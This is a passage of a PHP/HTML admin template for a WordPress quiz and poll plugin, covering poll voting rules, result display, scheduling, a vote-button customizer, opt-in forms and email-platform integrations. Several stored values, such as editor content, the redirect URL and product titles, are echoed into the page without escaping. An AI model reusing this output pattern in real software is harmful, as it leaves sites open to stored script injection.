		<div class="quiz_right-content">
				<select name="sqb_retak_option" id="sqb_retak_option">
					<option value="Unlimited" <?php if($sqb_attempts_allowed == 'Unlimited'){ echo 'selected'; } ?>>Unlimited</option>
					<option value="Limited" <?php if($sqb_attempts_allowed == 'Limited'){ echo 'selected'; } ?>>Limited</option>
				</select>
		</div>
	</div>
	
	<div class="quiz-content-card sqb_retak_max_attempt_outer" style="<?php echo $sqb_max_retake_display_style; ?>">
		<label for="" class="quiz_label">Enter Max Retake Limit</label>
		<div class="quiz_right-content">
			<input type="number" name="sqb_retak_max_attempt" id="sqb_retak_max_attempt" value="<?php echo $sqb_max_retake_value; ?>" max="100">
		</div>
	</div>
	
	<div class="quiz-content-card"  style="display:none!important;">
		<label for="" class="quiz_label">Do you want to display result screen?</label>
		<div class="quiz_right-content">
			<div class="square-switch_onoff">
				<input class="checkbox" name="show_result_screen" type="checkbox" id="show_result_screen" value="Y" checked="checked">
				<label for="show_result_screen"></label>
			</div>
		</div>
	</div>

	<!-- Poll Type Options -->

	<div class="quiz-content-card quiz-type-poll-settings" style="<?php if(isset($quiz_data) && ($quiz_type == "poll")){echo 'display:block'; } else{ echo 'display: none;'; }?>">
		<h5 class="quiz--sub-title">Poll Settings</h5>		
		
		<div class="quiz-content">
			<label for="" class="poll_quiz_label">Prevent Repeat Voting <div class="tool-tip">
						<i class="fa fa-info-circle" aria-hidden="true"></i>
						<div class="toll-tip-desc" style="max-width:400px;">Do you want to allow users to vote more than once? If not, select the right blocking option.</div>
					</div></label>
			<div class="quiz_right-content">
				<label for="browser-based" class="radio-btn--outer">
					<input type="radio" id="browser-based" name="repeat-voting" value="browser-based" checked="checked"> Block based on browser
				</label>

				<label for="browser-ip-based" class="radio-btn--outer mt-0">
					<input type="radio" id="browser-ip-based" name="repeat-voting" value="browser-ip-based" <?php if($repeat_voting == 'browser-ip-based'){ echo 'checked="checked"'; } ?>> Block based on browser and IP
				</label>

				<label for="repeated-voting" class="radio-btn--outer mt-0">
					<input type="radio" id="repeated-voting" name="repeat-voting" value="repeated-voting" <?php if($repeat_voting == 'repeated-voting'){ echo 'checked="checked"'; } ?>> Allow repeat voting
				</label>
			</div>
		</div>
		
		<div class="poll-quiz-content show-voting-again mt-3" style="<?php if($repeat_voting == 'browser-based'){ echo 'display: block;'; }else{ echo 'display: none;'; } ?>">
			<label for="" class="poll_quiz_label mb-1">When can users vote again?</label>
			<div class="quiz_right-content">
				<select name="allow-voting">
					<option value="0" <?php if($allow_voting == '0'){ echo "selected= 'selected'"; } ?>>Never</option>
					<option value="1" <?php if($allow_voting == '1'){ echo "selected= 'selected'"; } ?>>After 1 hour</option>
					<option value="6" <?php if($allow_voting == '6'){ echo "selected= 'selected'"; } ?>>After 6 hours</option>
					<option value="24" <?php if($allow_voting == '24'){ echo "selected= 'selected'"; } ?>>After 24 hours</option>
					<option value="168" <?php if($allow_voting == '168'){ echo "selected= 'selected'"; } ?>>After 1 week</option>
				</select>
			</div>
		</div>
		<hr class="dashed">

		<div class="poll-quiz-content">
			<!-- <label for="" class="poll_quiz_label">Result Display</label> -->
			<label for="" class="poll_quiz_label mb-1">Do you want to show results to users?</label>
			<div class="quiz_right-content">
				<div class="square-switch_onoff">
					<input class="checkbox" name="hide_results" type="checkbox" id="hide_results" value="Y" <?php echo $hide_results_checked; ?>>
					<label for="hide_results"></label>
				</div>
			</div>

			<div class="see-results mt-3" style="<?php if($hide_results == 'Y'){echo 'display: none;'; }else{ echo 'display: block;'; } ?>">
				<label for="" class="poll_quiz_label mb-1">Can users see results before voting?</label>
				<div class="quiz_right-content">
					<div class="square-switch_onoff">
						<input class="checkbox" name="allow_viewing_result" type="checkbox" id="allow_viewing_result" value="Y" <?php echo $allow_viewing_result_checked; ?>>
						<label for="allow_viewing_result"></label>
					</div>
				</div>
			</div>

			<div class="quiz_right-content view-result-content mt-3" style="<?php if($allow_viewing_result == 'Y'){ echo 'display: block;'; }else{ echo 'display: none;'; } ?>">
				<label class="poll_quiz_label mb-2">View Result Title</label>
				<div class="sqb_tiny_mce_editor content-text-editor view_result_content" contenteditable="true" spellcheck="false" style="position: relative;"><?php  if(isset($view_result_content) && $view_result_content != ''){
								echo  stripslashes($view_result_content); 
								}else{ echo 'View Result'; } ?></div>
			</div>

			<div class="quiz_right-content view-result-content mt-3" style="<?php if($allow_viewing_result == 'Y'){ echo 'display: block;'; }else{ echo 'display: none;'; } ?>">
				<label class="poll_quiz_label mb-2">Return to Poll Title</label>
				<div class="sqb_tiny_mce_editor content-text-editor return_poll_content" contenteditable="true" spellcheck="false" style="position: relative;"><?php  if(isset($return_poll_content) && $return_poll_content != ''){
								echo  stripslashes($return_poll_content); 
								}else{ echo 'Return to Poll'; } ?></div>
			</div>

			<?php if($hide_results == 'Y'){
				$show_hide_change_vote =  'display: none;'; 
			}else if($repeat_voting == 'repeated-voting'){ 
				$show_hide_change_vote =  'display: none;';
			}else if(isset($quiz_data) && ($quiz_data->getShowOptinScreen() == "Y")){
				$show_hide_change_vote =  'display: none;';
			}else{
				$show_hide_change_vote =  'display: block;';
			}	
			?>

			<div class="change-vote mt-3" style="<?php echo $show_hide_change_vote; ?>">
				<label for="" class="poll_quiz_label mb-1">Allow users to change vote?</label>
				<div class="quiz_right-content">
					<div class="square-switch_onoff">
						<input class="checkbox" name="change_vote" type="checkbox" id="change_vote" value="Y" <?php echo $change_vote_checked; ?>>
						<label for="change_vote"></label>
					</div>
				</div>
			</div>

			<div class="quiz_right-content change-vote-content mt-3" style="<?php if($change_vote == 'Y' && $hide_results == 'N'){ echo 'display: block;'; }else{ echo 'display: none;'; } ?>">
				<label class="poll_quiz_label mb-2">Translate Vote Count Label (it's for displaying the vote count)</label>
				<div class="sqb_tiny_mce_editor content-text-editor change_vote_content" contenteditable="true" spellcheck="false" style="position: relative;"><?php  if(isset($change_vote_content) && $change_vote_content != ''){
								echo  stripslashes($change_vote_content); 
								}else{ echo 'Change Vote'; } ?></div>
			</div>
		</div>
		<hr class="dashed">

		<div class="poll-quiz-content">
			<label for="" class="poll_quiz_label">Answer Order</label>
				<div class="quiz_right-content">
					<label for="order-as-configured" class="radio-btn--outer">
						<input type="radio" id="order-as-configured" name="answer-order" value="order-as-configured" checked="checked"> As configured in backend
					</label>
					<label for="order-random" class="radio-btn--outer mt-0">
						<input type="radio" id="order-random" name="answer-order" value="order-random" <?php if($answer_order == 'order-random'){ echo 'checked="checked"'; } ?>> Randomize
					</label>
					<label for="order-most-votes-on-top" class="radio-btn--outer mt-0">
						<input type="radio" id="order-most-votes-on-top" name="answer-order" value="order-most-votes-on-top" <?php if($answer_order == 'order-most-votes-on-top'){ echo 'checked="checked"'; } ?>> Show options in the order of votes received (Most votes on top)
					</label>
				</div>
		</div>
		<hr class="dashed">

		<div class="poll-quiz-content">
			<div class="quiz_right-content">
				<label for="" class="poll_quiz_label mb-2">Display this thank-you message to the participants after they have finished voting</label>
				<div class="quiz_right-content">
					<div class="square-switch_onoff">
						<input class="checkbox" name="display_message" type="checkbox" id="display_message" value="Y" <?php echo $display_message_checked; ?>>
						<label for="display_message"></label>
					</div>
				</div>
			</div>
			<div class="quiz_right-content display-message-content-showhide mt-2" style="<?php if($display_message == 'Y'){ echo 'display: block;'; }else{ echo 'display: none;'; } ?>">
				<div class="sqb_tiny_mce_editor display_message_content content-text-editor" contenteditable="true" spellcheck="false" style="position: relative;"><?php echo stripslashes($display_message_content); ?></div>
			</div>
			<hr class="dashed">

			<div class="quiz_right-content mt-2">
				<label for="" class="poll_quiz_label mb-2">Show total number of votes (total vote count)</label>
				<div class="quiz_right-content">
					<div class="square-switch_onoff">
						<input class="checkbox" name="hide_number" type="checkbox" id="hide_number" value="Y" <?php echo $hide_number_checked; ?>>
						<label for="hide_number"></label>
					</div>
				</div>
			</div>

			<div class="quiz_right-content show_vote_count_content mt-3" style="<?php if($hide_number == 'N'){ echo 'display: block;'; }else{ echo 'display: none;'; } ?>">
				<label class="poll_quiz_label mb-2">Vote Title</label>
				<div class="sqb_tiny_mce_editor content-text-editor show_vote_count" contenteditable="true" spellcheck="false" style="position: relative;"><?php  if(isset($show_vote_count) && $show_vote_count != ''){
								echo  stripslashes($show_vote_count); 
								}else{ echo 'Vote(s)'; } ?></div>
			</div>
			<hr class="dashed">

			<div class="quiz_right-content mt-2">
				<label for="" class="poll_quiz_label mb-2">Do you want to set a Poll Start Date?</label>
				<div class="quiz_right-content">
					<div class="square-switch_onoff">
						<input class="checkbox" name="poll_start_date" type="checkbox" id="poll_start_date" value="Y" <?php echo $poll_start_date_checked; ?>>
						<label for="poll_start_date"></label>
					</div>
				</div>
			</div>



			<div class="quiz_right-content start-poll-datetime mt-2" style="<?php if($poll_start_date == 'Y'){ echo 'display: block;'; }else{ echo 'display: none;'; } ?>">
				<label for="" class="poll_quiz_label mb-2">Start poll at a specific time</label>
			 	<div class="form-group mb-2">
			        <div class="input-group date" id="start_poll" data-target-input="nearest">
			         	<input type="text" name="start_poll" class="form-control datetimepicker-input" placeholder="YYYY-MM-DD HH:MM:SS" data-target="#start_poll" />
			         	<input type="hidden" value="<?php echo $start_poll; ?>" id="start_poll_value">
			          	<div class="input-group-append" data-target="#start_poll" data-toggle="datetimepicker">
			            	<div class="input-group-text"><i class="fa fa-calendar"></i></div>
			          	</div>
			        </div>
		      	</div>
			</div>

			<div class="quiz_right-content start_time_editor_main" style="<?php if($poll_start_date == 'Y'){ echo 'display: block;'; }else{ echo 'display: none;'; } ?>">
				<label class="poll_quiz_label mb-2">Poll Not Started Message</label>
				<div class="sqb_tiny_mce_editor content-text-editor start_time_editor" contenteditable="true" spellcheck="false" style="position: relative;"><?php echo $start_message_content; ?></div>
			</div>

			<div class="quiz_right-content mt-3">
				<label for="" class="poll_quiz_label mb-2">Close poll at a specific time</label>
				<div class="quiz_right-content">
					<div class="square-switch_onoff">
						<input class="checkbox" name="close_specific_time" type="checkbox" id="close_specific_time" value="Y" <?php echo $close_specific_time_checked; ?>>
						<label for="close_specific_time"></label>
					</div>
				</div>				
			</div>

			<div class="quiz_right-content close-poll-datetime mt-2" style="<?php if($close_specific_time == 'Y'){ echo 'display: block;'; }else{ echo 'display: none;'; } ?>">
				<label for="" class="poll_quiz_label mb-2">End poll at a specific time</label>
			 	<div class="form-group">
			        <div class="input-group date" id="close_poll" data-target-input="nearest">
			         	<input type="text" name="close_poll" class="form-control datetimepicker-input" placeholder="YYYY-MM-DD HH:MM:SS" data-target="#close_poll" />
			         	<input type="hidden" value="<?php echo $close_poll; ?>" id="close_poll_value">
			          	<div class="input-group-append" data-target="#close_poll" data-toggle="datetimepicker">
			            	<div class="input-group-text"><i class="fa fa-calendar"></i></div>
			          	</div>
			        </div>
		      	</div>
			</div>

			<div class="quiz_right-content close_time_editor_main" style="<?php if($close_specific_time == 'Y'){ echo 'display: block;'; }else{ echo 'display: none;'; } ?>">
				<label class="poll_quiz_label mb-2">Poll Ended Message</label>
				<div class="sqb_tiny_mce_editor content-text-editor close_time_editor" contenteditable="true" spellcheck="false" style="position: relative;"><?php echo $close_message_content; ?></div>
			</div>
			<hr class="dashed">
		</div>

		<div class="poll-quiz-content">
			<label for="" class="poll_quiz_label">Do you want to show results on the same screen or redirect to an outcome screen?</label>
			<div class="quiz_right-content">
				<div class="quiz_right-content">
					<label for="same-screen" class="radio-btn--outer">
						<input type="radio" id="same-screen" name="show_results" value="same-screen" checked="checked"> Same Screen
					</label>

					<label for="redirect-to-outcome" class="radio-btn--outer mt-0">
						<input type="radio" id="redirect-to-outcome" name="show_results" value="redirect-to-outcome" <?php if($show_results == 'redirect-to-outcome'){ echo 'checked="checked"'; } ?>> Redirect to outcome
					</label>
				</div>
			</div>
		</div>

		<div class="poll-quiz-content chart-disaply-outer mt-3" style="<?php if($show_results == 'redirect-to-outcome'){ echo 'display: block;'; }else{ echo 'display: none;'; } ?>">
			<label class="poll_quiz_label">Do you want to display charts on the outcome screen?</label>
			<div class="quiz_right-content" class="outcome-chart-display">
				<div class="quiz_right-content">
					<label for="not_display" class="radio-btn--outer">
						<input type="radio" id="not_display" name="chart_display" value="not_display" checked="checked"> No Charts
					</label>
					<label for="bar_chart" class="radio-btn--outer mt-0">
						<input type="radio" id="bar_chart" name="chart_display" value="bar_chart" <?php if($chart_display == 'bar_chart'){ echo 'checked="checked"'; } ?>> Bar Chart
					</label>

					<label for="pie_chart" class="radio-btn--outer mt-0">
						<input type="radio" id="pie_chart" name="chart_display" value="pie_chart" <?php if($chart_display == 'pie_chart'){ echo 'checked="checked"'; } ?>> Pie Chart
					</label>
					
				</div>
			</div>
			
			<div class="sqb_select_chart_message" style="max-width: 1110px; <?php if($chart_display == 'not_display'){ echo 'display: none;'; }else{ echo 'display: block;'; } ?>">Make sure to enter this shortcode on the outcome screen
			<br>[ShowPollResults]
			</div>
		</div>
		<hr class="dashed">
		<div class="poll-quiz-content">
			<!-- <label class="poll_quiz_label">Customize button</label> -->
			
			<div class="quiz_right-content">
				<div class="vote-customizer-section">					
					<div class="quiz-card-outer-gray vote_wrapper restriction_settings">
						<h5 class="quiz--sub-title" style="color:#444;">Vote Button Customizer</h5>
						<div class="vote_temp_container vote_template_html_preview_outer">
							<?php
							
							 
							if(isset($voteBtnHtml) && $voteBtnHtml != ''){
								echo  stripslashes($voteBtnHtml); 
								}else{
							?>

							<div data-questiontitle="%%question%%" class="vote_button sqb_tiny_mce_editor sqb_next_btn single_next_btn btn-add-vote show_cls %%showhide%%" style=" display: inline-block; border-radius: 5px; background: #4f6cbf; color: #fff; height: auto; padding: 10px 15px;font-family: 'DM Sans',sans-serif;  min-width: 130px; box-shadow: none; margin: 0; text-decoration: none; line-height: normal; border: none; text-align: center;text-transform: initial;font-size: 14px;font-weight: 600;  width: 128px;  max-width: 100%; cursor: pointer;float: none;"><div><span style="font-size: 13pt;" data-mce-style="font-size: 13pt;">Vote</span></div></div>
						
							<?php } ?>
						</div>
							<!--Customizer Start-->
						<div class="Template-Customize-setting-outer  Template-Customize-horizontal-style">
							 <div class="Template-Customize-Setting element_customizer_wrapper_list btn_customizer">
								

								<div class="customizer_innner_sections">
									<div class="Template-Customize-element">
										<div class="Template-Customize-element-inner element_paddings">
											<div class="inner_template_style_box">
												<h4>Width</h4>
												<p>
													<input id="vote_btn_width" class="slider" data-slider-id='ex1Slider' type="text" data-slider-min="0" data-slider-max="300" data-slider-step="1" data-slider-value="<?php echo $vote_btn_width;?>" />
												</p>
											</div>
											
											<div class="inner_template_style_box ">
												<h4>Height</h4>
												<p>
													<input id="vote_btn_height" class="slider" data-slider-id='ex1Slider' type="text" data-slider-min="0" data-slider-max="100" data-slider-step="1" data-slider-value="<?php echo $vote_btn_height;?>" />
												</p>
											</div>
											
											<div class="inner_template_style_box ">
												<h4>Background </h4>
												<div id="vote_button_backgroud_color_div" class="input-append color input-group colorpicker-component colorpicker-element">
													<input type="text" value="<?php echo $vote_backgroud_color;?>" id="vote_button_backgroud_color">
													<span class="input-group-addon"><i style="background-color:<?php echo $vote_backgroud_color;?>;"></i></span>
												</div>
												
											</div>
											<div class="inner_template_style_box">
												<h4>Border Radius</h4>
												<p>
													<input id="vote_btn_radius" class="slider" data-slider-id='ex1Slider' type="text" data-slider-min="0" data-slider-max="50" data-slider-step="1" data-slider-value="<?php echo $vote_btn_radius;?>" />
												</p>
											</div>
										</div>
									</div>
								</div>
							
							</div>
							
						</div>
						<!--Customizer ends-->
					</div>
				</div>
			</div>			
		</div>
	</div>

	<!-- Poll Type Options End -->
	
	<!--  -->
	<div class="quiz-content-card show_start_screen" style="border-width:<?php if(isset($quiz_data)){ if($quiz_data->getShowStartScreen() == "N"){ echo "1px";}else{ echo "0px";}}else { echo "0px";} ?>">
		<?php if(isset($quiz_data) && ($quiz_type == "form")){
				echo '<h5 class="quiz--sub-title">Show Start Screen / Button</h5>';
			}else{
				echo '<h5 class="quiz--sub-title">Show Start Screen / Button</h5>';
			} ?>		
		
		<label for="" class="quiz_label">Do you want to Show start screen?</label>
		<div class="quiz_right-content">
			<div class="square-switch_onoff">
				<input class="checkbox" name="show_start_screen" type="checkbox" id="show_start_screen" value="Y" <?php echo $show_start_screen_checked; ?>>
				<label for="show_start_screen"></label>
			</div>
		</div>
	</div>	
	<!--  -->

	

	<div class="quiz-content-card lead_gen_screen" style="border-width:<?php if(isset($quiz_data)){ if($quiz_data->getShowOptinScreen() == "N"){ echo "1px;";}else{ echo "0px;";}}else { echo "0px;";} ?> <?php if($quiz_type == "form"){echo 'display:none;';} ?>">
		<div class="lead-form">
			<h5 class="quiz--sub-title">Lead Generation Screen</h5>
		
			<label for="" class="quiz_label"><strong>Do you want to display an opt-in form?</strong></label>
			<div class="quiz_right-content">
				<div class="square-switch_onoff">
					<input class="checkbox" name="show_opt_screen" type="checkbox" id="show_opt_screen" value="Y" <?php echo $show_optin_screen_checked; ?>>
					<label for="show_opt_screen"></label>
				</div>
			</div>
		</div>
		<div class="sqb_opt_screen_position_outer" <?php if(isset($quiz_data)){ if($quiz_data->getShowOptinScreen() == "N" || $quiz_type == "form"){ echo 'style="display:none;"';} }?>>
			<label for="" class="quiz_label"><strong>When should the opt-in form be displayed?</strong></label>
				<div class="quiz_right-content">
					<label for="optin-after-questions-screen" class="radio-btn--outer">
					<input type="radio" id="optin-after-questions-screen" name="optin-screen-position" value="optin-after-questions-screen" <?php if(isset($quiz_data) && ($quiz_data->getOptinScreenPosition() == 'optin-before-questions-screen')){  }else{ echo "checked='checked'"; }?>> After the Question Screen
					</label>
					<label for="optin-before-questions-screen" class="radio-btn--outer optin-before-questions-screen" style="<?php if((isset($quiz_data) && $same_page_option == "no_next_button" && $quiz_pagination_checked1 == " checked") || (isset($quiz_data) && $same_page_option == "category_names" && $quiz_pagination_checked1 == " checked")){ echo 'display:none;'; } ?>">
					<input type="radio" id="optin-before-questions-screen" name="optin-screen-position" value="optin-before-questions-screen" <?php if(isset($quiz_data) && ($quiz_data->getOptinScreenPosition() == 'optin-before-questions-screen')){ echo "checked='checked'"; }else{ }?>> Before the Question Screen
					</label>
				</div>
		</div>	
	</div>
	
	
		
 <div class="sqb_opt_in_page_yes_div" style="display:<?php if(isset($quiz_data)){ if($quiz_data->getShowOptinScreen() == "N"){ echo "none";}else{ echo "block";}}else { echo "block";} ?>">
			<div class="quiz-content-card" style="display:none">
				<label for="" class="quiz_label">Where do you want to send users after they opt-in?</label>
					<div class="quiz_right-content start_template_outer">
							<select name="user_opt_in_redirect" id="user_opt_in_redirect">																					 
								<option value="opt_in_redirect_result_page" <?php echo $user_opt_in_redirect_selected;?>>I want to send users to a results page</option>	
								<option value="opt_in_redirect_specific_page" <?php echo $user_opt_in_redirect_selected1;?>>I want to redirect users to a specific page upon opt-in</option>												 
							</select>
							 
					</div>
				</div>
				<div class="quiz-content-card opt_in_redirect_specific_page_div1" style="display:none">
					<label for="" class="quiz_label">Enter Redirect URL</label>
					<div class="quiz_right-content">
						<input type="text" name="user_opt_in_redirect_url" id="user_opt_in_redirect_url" value="<?= isset($quiz_data) ? $quiz_data->getUserOptinRedirectUrl() : '' ?>">
					</div>
				</div>
		 
		 <div class="quiz-content-card" style=" border-bottom: 1px solid #efefef; <?php if($quiz_type == "form"){echo 'border-top: 1px solid #efefef;';} ?>">
				<h5 for="" class="quiz--sub-title">Connect with your Platform <div class="tool-tip"> <i class="fa fa-info-circle" aria-hidden="true"></i> <div class="toll-tip-desc" style="max-width:400px;">If you want to send lead details to your email platform, you can do that here.<br>SQB will add user (name, email) to the selected list/campaign. You can also configure outcome-level tags in the SQB &gt;&gt; outcome screen. SQB will also send the tag to the email platform.</div> </div> </h5>
				<label for="" class="quiz_label">Where should the users be added?</label>
					<div class="quiz_right-content">
						<ul>
							<li>
								<span class="checkbox-custom-style">
									<?php $sqb_wp_syncing = get_option('sqb_wp_syncing'); 
			                            $global_settins_checked = "";
			                            if(isset($sqb_wp_syncing) && $sqb_wp_syncing == 'Y'){
			                            	$global_settins_checked = "";
			                            	$global_settins_disabled = "";
			                            	$global_settins_class = "disable-checkbox";
			                            }else{
			                            	$global_settins_checked = "checked='checked'";
			                            	$global_settins_disabled = 'disabled="disabled"';
			                            	$global_settins_class = "";
			                            }
		                            ?>
									<input type="checkbox" name="add_user_quiz" value="add_user_in_wp" class="custom-checkbox-input <?php echo $global_settins_class; ?>"  <?php echo $global_settins_disabled; ?> <?php echo $global_settins_checked; ?>>
									<span class="custom--checkbox"></span>
								</span>
							
								<span>WordPress </span> <div class="tool-tip">
														<i class="fa fa-info-circle" aria-hidden="true"></i>
														<div class="toll-tip-desc" style="max-width:400px;">Do you want to disable WordPress sync? If yes, please <a href="javascript:void(0)" class="wp_sync">click here</a> to disable it globally. SQB will disable WordPress account creation / syncing for all quizzes, and not just for this quiz.</div>
													</div>
								<div class="disable-message" style="display: none; color: #e81111; padding:5px 0 0 20px">You've disabled syncing to WordPress globally. You can enable the sync settings in SQB >> settings >> global tab. </div>
							</li>
							<?php 
							if(function_exists('scp_generate_certificate')){
							//if (is_plugin_active('smart-creator-press/smart-creator-press.php')) {
								?>
								<li>
								<span class="checkbox-custom-style">
									<input type="checkbox" name="add_user_quiz" value="SCP" class="custom-checkbox-input" <?php echo $scp_checked;?>>
									<span class="custom--checkbox"></span>
								</span>
							
								<span>Smart Creator Press</span>
								<?php 
								$scp_obj_exists = "";
								if(!empty($scp_checked)){
									$scp_obj_exists = SQB_QuizAutoresponder::loadByQuizIdAndAutoresponderName($sqbeditid,'scp');
								} ?>
								<div id="sqb_scp_products" class="sqb_scp_products" style="<?php if(isset($scp_obj_exists) && !empty($scp_obj_exists)){}else{ echo 'display:none';}?>">
									<div class="form-group form-row mt-2 ml-4">
										<select class="form-control sel_scp_prods" name="sel_scp_prods1">
											<option value="">Select Product/Courses</option>
											<?php 
											if (isset($scp_checked) && !empty($scp_checked)) {
											    $courses = get_posts([
											        'post_type'      => array('scp-courses', 'scp-products'),
											        'post_status'    => 'publish',
											        'posts_per_page' => -1,
											    ]);

											    $scp_obj_exists_product_id = '';
												if(isset($scp_obj_exists)){
													$scp_obj_exists_product_id = $scp_obj_exists[0]->getActionData();
												}

											    foreach ($courses as $course) {
											    	$scp_obj_exists_selected = '';
													if($scp_obj_exists_product_id == $course->ID){
														$scp_obj_exists_selected = 'selected';
													}
											        echo "<option ".$scp_obj_exists_selected." value='".$course->ID."'>".$course->post_title."</option>";
											    }
											}
											 ?>
										</select>
									
									</div>
								</div>
							
							
							</li>
								<?php
							}  
							
							if(defined('DONOT_INCLUDE_DAP') && DONOT_INCLUDE_DAP =="Y"){
							}else{
							
							if(class_exists('Dap_Product')) { ?> 
							<li>
								<span class="checkbox-custom-style">
									<input type="checkbox" name="add_user_quiz" value="DAP" class="custom-checkbox-input" <?php echo $dap_checked;?>>
									<span class="custom--checkbox"></span>
								</span>
							
								<span>DAP</span>
								<?php 
								$dap_obj_exists = "";
								if(!empty($dap_checked)){
									$dap_obj_exists = SQB_QuizAutoresponder::loadByQuizIdAndAutoresponderName($sqbeditid,'dap');
								} ?>
								<div id="sqb_dap_products" class="sqb_dap_products" style="<?php if(isset($dap_obj_exists) && !empty($dap_obj_exists)){}else{ echo 'display:none';}?>">
									<div class="form-group form-row">
										<select class="form-control sel_dap_prods" name="sel_dap_prods1">
											<option value="">Select Product</option>
											<?php 
											if (isset($dap_checked) && !empty($dap_checked)) {
												$dap_products_list =  Dap_Product::loadProducts("","A");
												if(is_array($dap_products_list)){
													
													$dap_obj_exists_product_id = '';
													if(isset($dap_obj_exists)){
														$dap_obj_exists_product_id = $dap_obj_exists[0]->getActionData();
													}
													
													foreach($dap_products_list as $dap_product_list){
														$dap_obj_exists_selected = '';
														if($dap_obj_exists_product_id == $dap_product_list->getId()){
															$dap_obj_exists_selected = 'selected';
														}
														echo "<option ".$dap_obj_exists_selected." value='".$dap_product_list->getId()."'>".$dap_product_list->getName()."</option>";
														
													}
												}
											}
											 ?>
										</select>
									
									</div>
								</div>
							
							
							</li>
							<?php }
							}							?>
							<li>
								<span class="checkbox-custom-style">
									<input type="checkbox" name="add_user_quiz" value="add_user_in_your_email_platform" class="custom-checkbox-input"  <?php echo $emailplatform_checked;?>>
									<span class="custom--checkbox"></span>
								</span>
								
								<span>My Email Platform</span>
								
								<?php 
									  $user_added_plateform_array = array();
									  $auto_quiz_id  = 0;
									   if(isset($quiz_data)){
										  // echo $quiz_data->getUserAddedMyEmailPlatform();
										  $auto_quiz_id =  $quiz_data->getId();
										  
										   $user_added_plateform_array = explode(",",$quiz_data->getUserAddedPlatform());
										  // print_r($user_added_plateform_array);
										   
										}	
										 
										//print_r($user_added_plateform_array);
										$autoresponder_name = 'ACTIVECAMPAIGN';
										$activeCompaignobj = sqb_get_autoresponder_data_edit_mode($autoresponder_name);
										$activecompaign_url = '';
										$activecompaign_key = '';
										$activecompaign_connect_text = 'Click Here to Connect';
										$activecompaign_connect_class = "";
										$activecompaign_show_list = 'display:none';
										$activecompaign_show_connect_btn = 'display:none';
										if(in_array('ACTIVECAMPAIGN',$user_added_plateform_array)){ 
											$activecompaign_show_connect_btn = '';
										}
										
										$activecompaign_list_html = '<select id="sqb_select_list" class="form-control">
												   <option value="">Select List</option>
												</select>';
										//print_r($activeCompaignobj);
										$autoresponder_details_obj = array();
										$activecompaign_lists_sort_by_id = array();
										if(is_array($activeCompaignobj) && count($activeCompaignobj)){
											$activecompaign_url = '';
											if(isset($activeCompaignobj['url'])){
												$activecompaign_url = $activeCompaignobj['url'];
											}
											$activecompaign_key = '';
											if(isset($activeCompaignobj['key'])){
												$activecompaign_key = $activeCompaignobj['key'];
											}
											$activecompaign_lists_sort_by_id = '';
											if(isset($activeCompaignobj['lists_sort_by_id'])){
												$activecompaign_lists_sort_by_id = $activeCompaignobj['lists_sort_by_id'];
											}
											
											$activecompaign_connect_text = "Connected";
											$activecompaign_connect_class = "  btn-success ";
											$activecompaign_show_list = '';
											$activecompaign_show_connect_btn = '';
											
											$activecompaign_list_html = '';
											if(isset($activeCompaignobj['auto_html_select'])){
												$activecompaign_list_html = $activeCompaignobj['auto_html_select'];
											}
											$autoresponder_details_obj = SQB_QuizAutoresponder::loadByQuizIdAndAutoresponderName($auto_quiz_id,$autoresponder_name);
											
										}
										//print_r($activeCompaignobj);
										//echo "121+++"
										if(!in_array('ACTIVECAMPAIGN',$user_added_plateform_array)){ 
											$activecompaign_show_list = 'display:none';
										}
										?>
								
							 	<?php 
									$email_based_subscriber = "subscriber_based";
									$hide_email_based_options = 'style="display:none;"';

									$all_outcome .= '<div class="col-sm-2 add-all-outcomes autoresponder_outcome_data" '.$hide_email_based_options.'></div>';
									if(isset($quiz_data) && ($quiz_data->getId() !='')){
										$getAllOtherOptions = $quiz_data->getAllOtherOptions();

										if(!empty($getAllOtherOptions) && $getAllOtherOptions != 'NULL'){
											$all_other_options = maybe_unserialize($getAllOtherOptions);
											if(!empty($all_other_options['email_based_subscriber'])){
												$email_based_subscriber = $all_other_options['email_based_subscriber'];
											}
										}

										if($email_based_subscriber == 'outcome_based'){
											$hide_email_based_options = "";
										}

										$sqboutcomedata = SQB_Outcome::loadByQuizId($quiz_id);
										if($sqboutcomedata){
											$all_outcome = "";
											$all_outcome .= '<div class="col-sm-2 add-all-outcomes autoresponder_outcome_data" '.$hide_email_based_options.'><select class="form-control sqb_outcome_autoresponder sqb_auto_action " name="sqb_outcome_autoresponder" ><option value="">Select an Outcome</option>';
											foreach($sqboutcomedata as $sqboutcome){
												$all_outcome .= '<option value="'.$sqboutcome->getId().'">'.$sqboutcome->getOutcomeName().'</option>';
											}
											$all_outcome .= '</select></div>';
										}
									} 

									



								?>
								<div class="quiz-content-card my_email_platorm_div" style="<?php if(!in_array('add_user_in_your_email_platform',$user_added_my_email_platform)){ echo 'display:none;';}?>">
									<div class="quiz_right-content">
										<label for="add-all-subscribers" class="radio-btn--outer">
										<input type="radio" id="add-all-subscribers" name="email-based-subscribers" value="subscriber_based" <?php echo $email_based_subscriber == "subscriber_based" ? 'checked' : ''; ?>> Add all subscribers to the same list
										</label>
										<label for="add-subscribers-based-on-outcome" class="radio-btn--outer add-subscribers-based-on-outcome">
										<input type="radio" id="add-subscribers-based-on-outcome" name="email-based-subscribers" value="outcome_based" <?php echo $email_based_subscriber == "outcome_based" ? 'checked' : ''; ?>> Add subscribers to different lists based on outcome
										</label>
									</div>
								</div>	 

								<div class="form-group form-row sqb-no-outcome-error mt-4" style="display:none">
									<div class="alert alert-v2 alert-warning" role="alert" bis_skin_checked="1">
										<p>We notice you currently do not have any outcomes. To use this option, please complete this quiz setup, create the outcomes, then you can come back here and connect each outcome to different lists.</p>
									</div>
								</div>

								<ul  class="quiz_right-content my_email_platorm_div" style="<?php if(!in_array('add_user_in_your_email_platform',$user_added_my_email_platform)){ echo 'display:none;';}?>">
							
									<li>
										<div class="add_user_in_your_email_platform_inner">
											<span class="checkbox-custom-style">
												<input type="checkbox" name="add_user_in_your_email_platform" value="ACTIVECAMPAIGN" class="custom-checkbox-input" <?php if(in_array('ACTIVECAMPAIGN',$user_added_plateform_array)){ echo "checked='checked'"; }  ?>>  
												<span class="custom--checkbox"></span>
											</span>
											<span>ACTIVECAMPAIGN</span>
										</div>
										
										
										
										<button type="button" class="btn btn-primary checkeck_email_has <?php echo $activecompaign_connect_class; ?>" data-toggle="modal" data-target="#user_add_my_email_plateform_activecampaign_modal" style="<?php echo $activecompaign_show_connect_btn; ?>"><?php echo $activecompaign_connect_text; ?></button>
										<div class="form-group form-row sqb-ep-notice mt-4" style="<?php if(in_array('ACTIVECAMPAIGN',$user_added_plateform_array)){ echo "display:block"; }else{ echo "display:none"; }  ?>">
											<div class="alert alert-v2 alert-warning" role="alert" bis_skin_checked="1">
